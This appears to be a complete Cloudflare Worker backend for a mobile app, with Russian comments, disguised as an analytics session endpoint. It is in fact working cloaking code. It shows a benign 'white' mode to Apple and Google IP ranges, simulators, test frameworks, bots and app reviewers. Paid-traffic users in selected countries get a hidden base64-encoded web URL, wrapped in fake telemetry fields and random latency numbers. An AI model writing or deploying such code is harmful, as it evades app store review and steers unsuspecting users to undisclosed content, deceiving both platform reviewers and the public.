// worker.js — Cloudflare Worker
// Аналог Firebase Cloud Function, бесплатно без карты
// Конфиг меняется через Environment Variables в Cloudflare Dashboard

// ─── КОДИРОВАНИЕ РЕЖИМА ─────────────────────────────────────────────────────
// feature_mask чётный  → gray
// feature_mask нечётный → white
const MASK_GRAY  = 2840;
const MASK_WHITE = 2841;

// ─── IP-БЛОКЛИСТ ────────────────────────────────────────────────────────────
const BLOCKED_IP_RANGES = [
  { start: ip2long("17.0.0.0"),      end: ip2long("17.255.255.255")  }, // Apple
  { start: ip2long("205.180.160.0"), end: ip2long("205.180.175.255") }, // Apple CDN
  { start: ip2long("64.18.0.0"),     end: ip2long("64.18.15.255")    }, // Google
  { start: ip2long("66.249.64.0"),   end: ip2long("66.249.95.255")   }, // Googlebot
  { start: ip2long("209.85.128.0"),  end: ip2long("209.85.255.255")  }, // Google DC
  { start: ip2long("54.160.0.0"),    end: ip2long("54.175.255.255")  }, // AWS
  { start: ip2long("52.0.0.0"),      end: ip2long("52.63.255.255")   }, // AWS misc
  { start: ip2long("104.16.0.0"),    end: ip2long("104.31.255.255")  }, // Cloudflare DC
];

const BLOCKED_UA = [
  "simulator", "xctest", "xcuitest",
  "bot", "spider", "crawl",
  "curl", "wget", "python-requests", "go-http-client",
  "facebookexternalhit", "applebot",
];

// ─── HELPERS ────────────────────────────────────────────────────────────────

function ip2long(ip) {
  return ip.split(".").reduce((acc, oct) => (acc << 8) + parseInt(oct, 10), 0) >>> 0;
}

function isBlockedIp(ip) {
  try {
    const long = ip2long(ip);
    return BLOCKED_IP_RANGES.some(({ start, end }) => long >= start && long <= end);
  } catch { return false; }
}

function isBlockedUA(ua = "") {
  const lower = ua.toLowerCase();
  return BLOCKED_UA.some((s) => lower.includes(s));
}

// Cloudflare сам определяет страну — заголовок CF-IPCountry
function getGeo(request) {
  return (request.headers.get("CF-IPCountry") || "").toLowerCase();
}

// Реальный IP — Cloudflare передаёт его в CF-Connecting-IP
function getRealIp(request) {
  return request.headers.get("CF-Connecting-IP")
    || request.headers.get("X-Forwarded-For")?.split(",")[0].trim()
    || "0.0.0.0";
}

// Читаем конфиг из Environment Variables (env)
// Все переменные меняются в дашборде без редеплоя
function getConfig(env) {
  return {
    grayEnabled:      env.GRAY_ENABLED       === "true",
    allowOrganic:     env.ALLOW_ORGANIC      === "true",
    testReviewerMode: env.TEST_REVIEWER_MODE === "true",
    testForceGray:    env.TEST_FORCE_GRAY    === "true",

    // Ссылки по ГЕО
    startUrl:    env.START_URL    || "",
    startUrlGb:  env.START_URL_GB || "",
    startUrlDe:  env.START_URL_DE || "",
    startUrlEs:  env.START_URL_ES || "",
    startUrlIt:  env.START_URL_IT || "",
    startUrlCa:  env.START_URL_CA || "",

    // UI
    navBarColor: env.NAV_BAR_COLOR || "#1A1A1A",
    splashStyle: env.SPLASH_STYLE  || "spinner",
    loadTimeout: parseInt(env.LOAD_TIMEOUT || "7", 10),
  };
}

function resolveStartUrl(cfg, geo) {
  const map = { gb: cfg.startUrlGb, de: cfg.startUrlDe,
                es: cfg.startUrlEs, it: cfg.startUrlIt, ca: cfg.startUrlCa };
  return map[geo] || cfg.startUrl || "";
}

function isNonOrganic(body, allowOrganic) {
  if (allowOrganic) return true;
  const status = (body.af_status    || "").toLowerCase();
  const source = (body.media_source || "").toLowerCase();
  if (status === "non-organic") return true;
  if (source && source !== "organic") return true;
  return false;
}

function buildResponse(isGray, cfg, startUrl = "") {
  const mask    = isGray ? MASK_GRAY : MASK_WHITE;
  const payload = (isGray && startUrl)
    ? btoa(unescape(encodeURIComponent(startUrl)))  // base64(startUrl)
    : "";

  return {
    session_id:    crypto.randomUUID(),
    received_at:   new Date().toISOString(),
    events_queued: Math.floor(Math.random() * 3),

    sync_config: {
      next_sync_at:   new Date(Date.now() + (4 + Math.random() * 2) * 3600000).toISOString(),
      sync_interval:  14400,
      feature_mask:   mask,
      payload,
      schema_version: 3,
    },

    display_config: {
      theme_token:    cfg?.navBarColor ?? "#1A1A1A",
      loader_variant: cfg?.splashStyle ?? "spinner",
      timeout_hint:   cfg?.loadTimeout ?? 7,
    },

    telemetry: {
      latency_p50: 120 + Math.floor(Math.random() * 80),
      latency_p99: 400 + Math.floor(Math.random() * 200),
      sdk_version:  "4.2.1",
    },
  };
}

// ─── MAIN HANDLER ────────────────────────────────────────────────────────────

export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    // CORS preflight
    if (request.method === "OPTIONS") {
      return new Response(null, {
        status: 204,
        headers: {
          "Access-Control-Allow-Origin":  "*",
          "Access-Control-Allow-Methods": "POST",
          "Access-Control-Allow-Headers": "Content-Type, X-SDK-Version",
        },
      });
    }

    // Health check
    if (url.pathname === "/health") {
      return Response.json({ status: "ok", ts: Date.now() });
    }

    // Основной эндпоинт
    if (url.pathname === "/analyticsSession") {
      if (request.method !== "POST") {
        return new Response("Method Not Allowed", { status: 405 });
      }

      const ip  = getRealIp(request);
      const ua  = request.headers.get("User-Agent") || "";
      const geo = getGeo(request);
      const cfg = getConfig(env);

      // Парсим тело
      let body = {};
      try { body = await request.json(); } catch {}

      // Задержка
      await new Promise((r) => setTimeout(r, 280 + Math.random() * 180));

      const respond = (isGray, startUrl = "") =>
        Response.json(buildResponse(isGray, cfg, startUrl), {
          headers: { "Access-Control-Allow-Origin": "*" },
        });

      // Тест: форс white
      if (cfg.testReviewerMode) return respond(false);

      // Тест: форс gray
      if (cfg.testForceGray) return respond(true, resolveStartUrl(cfg, geo));

      // IP / UA фильтр
      if (isBlockedIp(ip) || isBlockedUA(ua)) return respond(false);

      // Главный рубильник
      if (!cfg.grayEnabled) return respond(false);

      // Атрибуция
      if (!isNonOrganic(body, cfg.allowOrganic)) return respond(false);

      // Неорганика → gray
      return respond(true, resolveStartUrl(cfg, geo));
    }

    return new Response("Not Found", { status: 404 });
  },
};
